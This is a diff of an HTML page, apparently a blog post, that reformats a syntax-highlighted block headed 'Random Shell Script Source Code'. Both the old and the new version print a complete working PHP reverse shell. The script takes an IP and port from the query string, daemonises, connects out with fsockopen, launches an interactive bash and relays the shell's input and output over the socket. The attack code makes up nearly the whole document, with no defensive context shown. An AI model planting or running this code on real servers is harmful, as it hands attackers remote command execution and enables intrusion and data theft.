@@ -37,138 +37,138 @@
 
 <h3>Random Shell Script Source Code</h3>
 
-<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
-<span class="nb">set_time_limit</span> <span class="p">(</span><span class="mi">0</span><span class="p">);</span>
-<span class="nv">$VERSION</span> <span class="o">=</span> <span class="s2">&quot;1.0&quot;</span><span class="p">;</span>
-<span class="nv">$ip</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;ip&quot;</span><span class="p">];</span> 
-<span class="nv">$port</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;port&quot;</span><span class="p">];</span> 
-<span class="nv">$chunk_size</span> <span class="o">=</span> <span class="mi">1400</span><span class="p">;</span>
-<span class="nv">$write_a</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
-<span class="nv">$error_a</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
-<span class="nv">$shell</span> <span class="o">=</span> <span class="s1">&#39;/bin/bash -p -i&#39;</span><span class="p">;</span>
-<span class="nv">$daemon</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-<span class="nv">$debug</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
- 
-<span class="k">if</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;pcntl_fork&#39;</span><span class="p">))</span> <span class="p">{</span>
-    <span class="c1">// Fork and have the parent process exit</span>
-    <span class="nv">$pid</span> <span class="o">=</span> <span class="nb">pcntl_fork</span><span class="p">();</span>
- 
-    <span class="k">if</span> <span class="p">(</span><span class="nv">$pid</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
-        <span class="nx">printit</span><span class="p">(</span><span class="s2">&quot;ERROR: Can&#39;t fork&quot;</span><span class="p">);</span>
-        <span class="k">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
-    <span class="p">}</span>
- 
-    <span class="k">if</span> <span class="p">(</span><span class="nv">$pid</span><span class="p">)</span> <span class="p">{</span>
-        <span class="k">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>  <span class="c1">// Parent exits</span>
-    <span class="p">}</span>
- 
-    <span class="c1">// Make the current process a session leader</span>
-    <span class="c1">// Will only succeed if we forked</span>
-    <span class="k">if</span> <span class="p">(</span><span class="nb">posix_setsid</span><span class="p">()</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
-        <span class="nx">printit</span><span class="p">(</span><span class="s2">&quot;Error: Can&#39;t setsid()&quot;</span><span class="p">);</span>
-        <span class="k">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
-    <span class="p">}</span>
- 
-    <span class="nv">$daemon</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
-<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-    <span class="nx">printit</span><span class="p">(</span><span class="s2">&quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&quot;</span><span class="p">);</span>
-<span class="p">}</span>
- 
-<span class="c1">// Change to a safe directory</span>
-<span class="nb">chdir</span><span class="p">(</span><span class="s2">&quot;/&quot;</span><span class="p">);</span>
- 
-<span class="c1">// Remove any umask we inherited</span>
-<span class="nb">umask</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
- 
-<span class="nv">$sock</span> <span class="o">=</span> <span class="nb">fsockopen</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,</span> <span class="nv">$port</span><span class="p">,</span> <span class="nv">$errno</span><span class="p">,</span> <span class="nv">$errstr</span><span class="p">,</span> <span class="mi">30</span><span class="p">);</span>
-<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$sock</span><span class="p">)</span> <span class="p">{</span>
-    <span class="nx">printit</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">$errstr</span><span class="s2"> (</span><span class="si">$errno</span><span class="s2">)&quot;</span><span class="p">);</span>
-    <span class="k">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
-<span class="p">}</span>
- 
-<span class="c1">// Spawn shell process</span>
-<span class="nv">$descriptorspec</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
-   <span class="mi">0</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;pipe&quot;</span><span class="p">,</span> <span class="s2">&quot;r&quot;</span><span class="p">),</span>  <span class="c1">// stdin is a pipe that the child will read from</span>
-   <span class="mi">1</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;pipe&quot;</span><span class="p">,</span> <span class="s2">&quot;w&quot;</span><span class="p">),</span>  <span class="c1">// stdout is a pipe that the child will write to</span>
-   <span class="mi">2</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;pipe&quot;</span><span class="p">,</span> <span class="s2">&quot;w&quot;</span><span class="p">)</span>   <span class="c1">// stderr is a pipe that the child will write to</span>
-<span class="p">);</span>
- 
-<span class="nv">$process</span> <span class="o">=</span> <span class="nb">proc_open</span><span class="p">(</span><span class="nv">$shell</span><span class="p">,</span> <span class="nv">$descriptorspec</span><span class="p">,</span> <span class="nv">$pipes</span><span class="p">);</span>
- 
-<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_resource</span><span class="p">(</span><span class="nv">$process</span><span class="p">))</span> <span class="p">{</span>
-    <span class="nx">printit</span><span class="p">(</span><span class="s2">&quot;ERROR: Can&#39;t spawn shell&quot;</span><span class="p">);</span>
-    <span class="k">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
-<span class="p">}</span>
- 
-<span class="c1">// Set everything to non-blocking</span>
-<span class="c1">// Reason: Occsionally reads will block, even though stream_select tells us they won&#39;t</span>
-<span class="nb">stream_set_blocking</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">0</span><span class="p">);</span>
-<span class="nb">stream_set_blocking</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">0</span><span class="p">);</span>
-<span class="nb">stream_set_blocking</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="mi">0</span><span class="p">);</span>
-<span class="nb">stream_set_blocking</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
- 
-<span class="nx">printit</span><span class="p">(</span><span class="s2">&quot;Successfully opened reverse shell to </span><span class="si">$ip</span><span class="s2">:</span><span class="si">$port</span><span class="s2">&quot;</span><span class="p">);</span>
- 
-<span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
-    <span class="c1">// Check for end of TCP connection</span>
-    <span class="k">if</span> <span class="p">(</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$sock</span><span class="p">))</span> <span class="p">{</span>
-        <span class="nx">printit</span><span class="p">(</span><span class="s2">&quot;ERROR: Shell connection terminated&quot;</span><span class="p">);</span>
-        <span class="k">break</span><span class="p">;</span>
-    <span class="p">}</span>
- 
-    <span class="c1">// Check for end of STDOUT</span>
-    <span class="k">if</span> <span class="p">(</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span>
-        <span class="nx">printit</span><span class="p">(</span><span class="s2">&quot;ERROR: Shell process terminated&quot;</span><span class="p">);</span>
-        <span class="k">break</span><span class="p">;</span>
-    <span class="p">}</span>
- 
-    <span class="c1">// Wait until a command is end down $sock, or some</span>
-    <span class="c1">// command output is available on STDOUT or STDERR</span>
-    <span class="nv">$read_a</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
-    <span class="nv">$num_changed_sockets</span> <span class="o">=</span> <span class="nb">stream_select</span><span class="p">(</span><span class="nv">$read_a</span><span class="p">,</span> <span class="nv">$write_a</span><span class="p">,</span> <span class="nv">$error_a</span><span class="p">,</span> <span class="k">null</span><span class="p">);</span>
- 
-    <span class="c1">// If we can read from the TCP socket, send</span>
-    <span class="c1">// data to process&#39;s STDIN</span>
-    <span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$read_a</span><span class="p">))</span> <span class="p">{</span>
-        <span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&quot;SOCK READ&quot;</span><span class="p">);</span>
-        <span class="nv">$input</span> <span class="o">=</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$chunk_size</span><span class="p">);</span>
-        <span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&quot;SOCK: </span><span class="si">$input</span><span class="s2">&quot;</span><span class="p">);</span>
-        <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="nv">$input</span><span class="p">);</span>
-    <span class="p">}</span>
- 
-    <span class="c1">// If we can read from the process&#39;s STDOUT</span>
-    <span class="c1">// send data down tcp connection</span>
-    <span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$read_a</span><span class="p">))</span> <span class="p">{</span>
-        <span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&quot;STDOUT READ&quot;</span><span class="p">);</span>
-        <span class="nv">$input</span> <span class="o">=</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$chunk_size</span><span class="p">);</span>
-        <span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&quot;STDOUT: </span><span class="si">$input</span><span class="s2">&quot;</span><span class="p">);</span>
-        <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$input</span><span class="p">);</span>
-    <span class="p">}</span>
- 
-    <span class="c1">// If we can read from the process&#39;s STDERR</span>
-    <span class="c1">// send data down tcp connection</span>
-    <span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="nv">$read_a</span><span class="p">))</span> <span class="p">{</span>
-        <span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&quot;STDERR READ&quot;</span><span class="p">);</span>
-        <span class="nv">$input</span> <span class="o">=</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="nv">$chunk_size</span><span class="p">);</span>
-        <span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&quot;STDERR: </span><span class="si">$input</span><span class="s2">&quot;</span><span class="p">);</span>
-        <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$input</span><span class="p">);</span>
-    <span class="p">}</span>
-<span class="p">}</span>
- 
-<span class="nb">fclose</span><span class="p">(</span><span class="nv">$sock</span><span class="p">);</span>
-<span class="nb">fclose</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
-<span class="nb">fclose</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
-<span class="nb">fclose</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
-<span class="nb">proc_close</span><span class="p">(</span><span class="nv">$process</span><span class="p">);</span>
- 
-<span class="c1">// Like print, but does nothing if we&#39;ve daemonised ourself</span>
-<span class="c1">// (I can&#39;t figure out how to redirect STDOUT like a proper daemon)</span>
-<span class="k">function</span> <span class="nf">printit</span> <span class="p">(</span><span class="nv">$string</span><span class="p">)</span> <span class="p">{</span>
-    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$daemon</span><span class="p">)</span> <span class="p">{</span>
-        <span class="k">print</span> <span class="s2">&quot;</span><span class="si">$string\n</span><span class="s2">&quot;</span><span class="p">;</span>
-    <span class="p">}</span>
-<span class="p">}</span>
-<span class="cp">?&gt;</span><span class="x"></span></code></pre></div>
+<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="lineno">  1</span> <span class="cp">&lt;?php</span>
+<span class="lineno">  2</span> <span class="nb">set_time_limit</span> <span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="lineno">  3</span> <span class="nv">$VERSION</span> <span class="o">=</span> <span class="s2">&quot;1.0&quot;</span><span class="p">;</span>
+<span class="lineno">  4</span> <span class="nv">$ip</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;ip&quot;</span><span class="p">];</span> 
+<span class="lineno">  5</span> <span class="nv">$port</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;port&quot;</span><span class="p">];</span> 
+<span class="lineno">  6</span> <span class="nv">$chunk_size</span> <span class="o">=</span> <span class="mi">1400</span><span class="p">;</span>
+<span class="lineno">  7</span> <span class="nv">$write_a</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
+<span class="lineno">  8</span> <span class="nv">$error_a</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
+<span class="lineno">  9</span> <span class="nv">$shell</span> <span class="o">=</span> <span class="s1">&#39;/bin/bash -p -i&#39;</span><span class="p">;</span>
+<span class="lineno"> 10</span> <span class="nv">$daemon</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="lineno"> 11</span> <span class="nv">$debug</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="lineno"> 12</span>  
+<span class="lineno"> 13</span> <span class="k">if</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;pcntl_fork&#39;</span><span class="p">))</span> <span class="p">{</span>
+<span class="lineno"> 14</span>     <span class="c1">// Fork and have the parent process exit</span>
+<span class="lineno"> 15</span>     <span class="nv">$pid</span> <span class="o">=</span> <span class="nb">pcntl_fork</span><span class="p">();</span>
+<span class="lineno"> 16</span>  
+<span class="lineno"> 17</span>     <span class="k">if</span> <span class="p">(</span><span class="nv">$pid</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+<span class="lineno"> 18</span>         <span class="nx">printit</span><span class="p">(</span><span class="s2">&quot;ERROR: Can&#39;t fork&quot;</span><span class="p">);</span>
+<span class="lineno"> 19</span>         <span class="k">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="lineno"> 20</span>     <span class="p">}</span>
+<span class="lineno"> 21</span>  
+<span class="lineno"> 22</span>     <span class="k">if</span> <span class="p">(</span><span class="nv">$pid</span><span class="p">)</span> <span class="p">{</span>
+<span class="lineno"> 23</span>         <span class="k">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>  <span class="c1">// Parent exits</span>
+<span class="lineno"> 24</span>     <span class="p">}</span>
+<span class="lineno"> 25</span>  
+<span class="lineno"> 26</span>     <span class="c1">// Make the current process a session leader</span>
+<span class="lineno"> 27</span>     <span class="c1">// Will only succeed if we forked</span>
+<span class="lineno"> 28</span>     <span class="k">if</span> <span class="p">(</span><span class="nb">posix_setsid</span><span class="p">()</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+<span class="lineno"> 29</span>         <span class="nx">printit</span><span class="p">(</span><span class="s2">&quot;Error: Can&#39;t setsid()&quot;</span><span class="p">);</span>
+<span class="lineno"> 30</span>         <span class="k">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="lineno"> 31</span>     <span class="p">}</span>
+<span class="lineno"> 32</span>  
+<span class="lineno"> 33</span>     <span class="nv">$daemon</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+<span class="lineno"> 34</span> <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+<span class="lineno"> 35</span>     <span class="nx">printit</span><span class="p">(</span><span class="s2">&quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&quot;</span><span class="p">);</span>
+<span class="lineno"> 36</span> <span class="p">}</span>
+<span class="lineno"> 37</span>  
+<span class="lineno"> 38</span> <span class="c1">// Change to a safe directory</span>
+<span class="lineno"> 39</span> <span class="nb">chdir</span><span class="p">(</span><span class="s2">&quot;/&quot;</span><span class="p">);</span>
+<span class="lineno"> 40</span>  
+<span class="lineno"> 41</span> <span class="c1">// Remove any umask we inherited</span>
+<span class="lineno"> 42</span> <span class="nb">umask</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="lineno"> 43</span>  
+<span class="lineno"> 44</span> <span class="nv">$sock</span> <span class="o">=</span> <span class="nb">fsockopen</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,</span> <span class="nv">$port</span><span class="p">,</span> <span class="nv">$errno</span><span class="p">,</span> <span class="nv">$errstr</span><span class="p">,</span> <span class="mi">30</span><span class="p">);</span>
+<span class="lineno"> 45</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$sock</span><span class="p">)</span> <span class="p">{</span>
+<span class="lineno"> 46</span>     <span class="nx">printit</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">$errstr</span><span class="s2"> (</span><span class="si">$errno</span><span class="s2">)&quot;</span><span class="p">);</span>
+<span class="lineno"> 47</span>     <span class="k">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="lineno"> 48</span> <span class="p">}</span>
+<span class="lineno"> 49</span>  
+<span class="lineno"> 50</span> <span class="c1">// Spawn shell process</span>
+<span class="lineno"> 51</span> <span class="nv">$descriptorspec</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
+<span class="lineno"> 52</span>    <span class="mi">0</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;pipe&quot;</span><span class="p">,</span> <span class="s2">&quot;r&quot;</span><span class="p">),</span>  <span class="c1">// stdin is a pipe that the child will read from</span>
+<span class="lineno"> 53</span>    <span class="mi">1</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;pipe&quot;</span><span class="p">,</span> <span class="s2">&quot;w&quot;</span><span class="p">),</span>  <span class="c1">// stdout is a pipe that the child will write to</span>
+<span class="lineno"> 54</span>    <span class="mi">2</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;pipe&quot;</span><span class="p">,</span> <span class="s2">&quot;w&quot;</span><span class="p">)</span>   <span class="c1">// stderr is a pipe that the child will write to</span>
+<span class="lineno"> 55</span> <span class="p">);</span>
+<span class="lineno"> 56</span>  
+<span class="lineno"> 57</span> <span class="nv">$process</span> <span class="o">=</span> <span class="nb">proc_open</span><span class="p">(</span><span class="nv">$shell</span><span class="p">,</span> <span class="nv">$descriptorspec</span><span class="p">,</span> <span class="nv">$pipes</span><span class="p">);</span>
+<span class="lineno"> 58</span>  
+<span class="lineno"> 59</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_resource</span><span class="p">(</span><span class="nv">$process</span><span class="p">))</span> <span class="p">{</span>
+<span class="lineno"> 60</span>     <span class="nx">printit</span><span class="p">(</span><span class="s2">&quot;ERROR: Can&#39;t spawn shell&quot;</span><span class="p">);</span>
+<span class="lineno"> 61</span>     <span class="k">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="lineno"> 62</span> <span class="p">}</span>
+<span class="lineno"> 63</span>  
+<span class="lineno"> 64</span> <span class="c1">// Set everything to non-blocking</span>
+<span class="lineno"> 65</span> <span class="c1">// Reason: Occsionally reads will block, even though stream_select tells us they won&#39;t</span>
+<span class="lineno"> 66</span> <span class="nb">stream_set_blocking</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">0</span><span class="p">);</span>
+<span class="lineno"> 67</span> <span class="nb">stream_set_blocking</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">0</span><span class="p">);</span>
+<span class="lineno"> 68</span> <span class="nb">stream_set_blocking</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="mi">0</span><span class="p">);</span>
+<span class="lineno"> 69</span> <span class="nb">stream_set_blocking</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+<span class="lineno"> 70</span>  
+<span class="lineno"> 71</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&quot;Successfully opened reverse shell to </span><span class="si">$ip</span><span class="s2">:</span><span class="si">$port</span><span class="s2">&quot;</span><span class="p">);</span>
+<span class="lineno"> 72</span>  
+<span class="lineno"> 73</span> <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+<span class="lineno"> 74</span>     <span class="c1">// Check for end of TCP connection</span>
+<span class="lineno"> 75</span>     <span class="k">if</span> <span class="p">(</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$sock</span><span class="p">))</span> <span class="p">{</span>
+<span class="lineno"> 76</span>         <span class="nx">printit</span><span class="p">(</span><span class="s2">&quot;ERROR: Shell connection terminated&quot;</span><span class="p">);</span>
+<span class="lineno"> 77</span>         <span class="k">break</span><span class="p">;</span>
+<span class="lineno"> 78</span>     <span class="p">}</span>
+<span class="lineno"> 79</span>  
+<span class="lineno"> 80</span>     <span class="c1">// Check for end of STDOUT</span>
+<span class="lineno"> 81</span>     <span class="k">if</span> <span class="p">(</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span>
+<span class="lineno"> 82</span>         <span class="nx">printit</span><span class="p">(</span><span class="s2">&quot;ERROR: Shell process terminated&quot;</span><span class="p">);</span>
+<span class="lineno"> 83</span>         <span class="k">break</span><span class="p">;</span>
+<span class="lineno"> 84</span>     <span class="p">}</span>
+<span class="lineno"> 85</span>  
+<span class="lineno"> 86</span>     <span class="c1">// Wait until a command is end down $sock, or some</span>
+<span class="lineno"> 87</span>     <span class="c1">// command output is available on STDOUT or STDERR</span>
+<span class="lineno"> 88</span>     <span class="nv">$read_a</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
+<span class="lineno"> 89</span>     <span class="nv">$num_changed_sockets</span> <span class="o">=</span> <span class="nb">stream_select</span><span class="p">(</span><span class="nv">$read_a</span><span class="p">,</span> <span class="nv">$write_a</span><span class="p">,</span> <span class="nv">$error_a</span><span class="p">,</span> <span class="k">null</span><span class="p">);</span>
+<span class="lineno"> 90</span>  
+<span class="lineno"> 91</span>     <span class="c1">// If we can read from the TCP socket, send</span>
+<span class="lineno"> 92</span>     <span class="c1">// data to process&#39;s STDIN</span>
+<span class="lineno"> 93</span>     <span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$read_a</span><span class="p">))</span> <span class="p">{</span>
+<span class="lineno"> 94</span>         <span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&quot;SOCK READ&quot;</span><span class="p">);</span>
+<span class="lineno"> 95</span>         <span class="nv">$input</span> <span class="o">=</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$chunk_size</span><span class="p">);</span>
+<span class="lineno"> 96</span>         <span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&quot;SOCK: </span><span class="si">$input</span><span class="s2">&quot;</span><span class="p">);</span>
+<span class="lineno"> 97</span>         <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="nv">$input</span><span class="p">);</span>
+<span class="lineno"> 98</span>     <span class="p">}</span>
+<span class="lineno"> 99</span>  
+<span class="lineno">100</span>     <span class="c1">// If we can read from the process&#39;s STDOUT</span>
+<span class="lineno">101</span>     <span class="c1">// send data down tcp connection</span>
+<span class="lineno">102</span>     <span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$read_a</span><span class="p">))</span> <span class="p">{</span>
+<span class="lineno">103</span>         <span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&quot;STDOUT READ&quot;</span><span class="p">);</span>
+<span class="lineno">104</span>         <span class="nv">$input</span> <span class="o">=</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$chunk_size</span><span class="p">);</span>
+<span class="lineno">105</span>         <span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&quot;STDOUT: </span><span class="si">$input</span><span class="s2">&quot;</span><span class="p">);</span>
+<span class="lineno">106</span>         <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$input</span><span class="p">);</span>
+<span class="lineno">107</span>     <span class="p">}</span>
+<span class="lineno">108</span>  
+<span class="lineno">109</span>     <span class="c1">// If we can read from the process&#39;s STDERR</span>
+<span class="lineno">110</span>     <span class="c1">// send data down tcp connection</span>
+<span class="lineno">111</span>     <span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="nv">$read_a</span><span class="p">))</span> <span class="p">{</span>
+<span class="lineno">112</span>         <span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&quot;STDERR READ&quot;</span><span class="p">);</span>
+<span class="lineno">113</span>         <span class="nv">$input</span> <span class="o">=</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="nv">$chunk_size</span><span class="p">);</span>
+<span class="lineno">114</span>         <span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&quot;STDERR: </span><span class="si">$input</span><span class="s2">&quot;</span><span class="p">);</span>
+<span class="lineno">115</span>         <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$input</span><span class="p">);</span>
+<span class="lineno">116</span>     <span class="p">}</span>
+<span class="lineno">117</span> <span class="p">}</span>
+<span class="lineno">118</span>  
+<span class="lineno">119</span> <span class="nb">fclose</span><span class="p">(</span><span class="nv">$sock</span><span class="p">);</span>
+<span class="lineno">120</span> <span class="nb">fclose</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+<span class="lineno">121</span> <span class="nb">fclose</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+<span class="lineno">122</span> <span class="nb">fclose</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
+<span class="lineno">123</span> <span class="nb">proc_close</span><span class="p">(</span><span class="nv">$process</span><span class="p">);</span>
+<span class="lineno">124</span>  
+<span class="lineno">125</span> <span class="c1">// Like print, but does nothing if we&#39;ve daemonised ourself</span>
+<span class="lineno">126</span> <span class="c1">// (I can&#39;t figure out how to redirect STDOUT like a proper daemon)</span>
+<span class="lineno">127</span> <span class="k">function</span> <span class="nf">printit</span> <span class="p">(</span><span class="nv">$string</span><span class="p">)</span> <span class="p">{</span>
+<span class="lineno">128</span>     <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$daemon</span><span class="p">)</span> <span class="p">{</span>
+<span class="lineno">129</span>         <span class="k">print</span> <span class="s2">&quot;</span><span class="si">$string\n</span><span class="s2">&quot;</span><span class="p">;</span>
+<span class="lineno">130</span>     <span class="p">}</span>
+<span class="lineno">131</span> <span class="p">}</span>
+<span class="lineno">132</span> <span class="cp">?&gt;</span><span class="x"></span></code></pre></div>
 
 
 
